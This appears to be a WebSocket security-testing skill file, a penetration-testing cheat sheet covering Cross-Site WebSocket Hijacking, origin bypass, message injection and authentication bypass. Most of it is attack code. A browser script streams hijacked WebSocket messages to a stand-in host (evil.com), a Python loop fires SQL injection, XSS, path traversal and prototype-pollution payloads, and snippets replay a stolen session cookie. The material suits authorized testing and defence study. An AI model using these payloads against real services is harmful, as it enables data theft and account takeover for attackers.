---
name: websocket-security
description: WebSocket security testing covering CSWSH, origin bypass, message injection, authentication bypass, and DoS attacks
---

# WebSocket Security

## Key Vulnerabilities

### Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- If WebSocket doesn't validate Origin header, attacker can connect from any page -->
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onmessage = function(e) {
  // Steal data — send to attacker
  new Image().src = 'https://evil.com/steal?data=' + btoa(e.data);
};
ws.onopen = function() {
  // Send commands as victim
  ws.send(JSON.stringify({action: "getProfile"}));
};
</script>
```

### Origin Bypass

```bash
# Test if server validates Origin header
curl -sk -N --http1.1 \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGVzdA==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: https://evil.com" \
  "https://TARGET/ws"
# If connection accepted with evil Origin → CSWSH possible
```

### Message Injection

```python
import websocket, json

ws = websocket.create_connection("wss://TARGET/ws")

# Test injection in message fields
payloads = [
    {"action": "getUser", "id": "1 OR 1=1"},
    {"action": "admin", "role": "superuser"},
    {"message": "<script>alert(1)</script>"},
    {"action": "../../../etc/passwd"},
    {"__proto__": {"admin": True}},
]
for p in payloads:
    ws.send(json.dumps(p))
    result = ws.recv()
    print(f"Payload: {p} -> {result[:200]}")
```

### Authentication Bypass

```python
# Connect without authentication token
ws = websocket.create_connection("wss://TARGET/ws")
ws.send(json.dumps({"action": "getUsers"}))
print(ws.recv())  # If data returned → auth bypass

# Forge/manipulate auth in WebSocket handshake
ws = websocket.create_connection("wss://TARGET/ws",
    cookie="session=stolen_token",
    header=["Authorization: Bearer invalid_token"])
```

## Pro Tips

1. CSWSH is the most impactful WS vulnerability — browsers send cookies with WS connections by default
2. Unlike HTTP, WebSocket messages bypass CORS — so origin validation is the only protection
3. Test ALL message types for injection — SQLi, XSS, IDOR in WebSocket message fields
4. WebSocket connections persist — a single CSWSH can maintain ongoing data theft
5. Check if WS connection downgrades to HTTP long-polling (often with weaker auth)
